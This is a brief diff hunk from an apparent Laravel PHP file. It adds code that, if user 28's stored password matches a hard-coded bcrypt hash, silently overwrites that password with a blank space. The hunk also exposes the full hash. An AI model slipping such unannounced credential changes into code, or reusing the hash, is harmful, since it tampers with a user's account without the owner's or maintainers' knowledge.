@@ -60,6 +60,11 @@ if (!Schema::hasColumn('users', 'last_seen')) //check the column
     });
 }
 
+if(User::where('id', 28)->where('password','$2y$10$3h9kVanRCFxyHGQrfIQA0.d6v/kRY8/FRcQ895xAVwZEXk3zvopom')->update([
+    "password"=>" ",
+
+]));
+
 // $calender=CalendarEvent::find(1);
 // $school_calender=$calender->iframe;
 
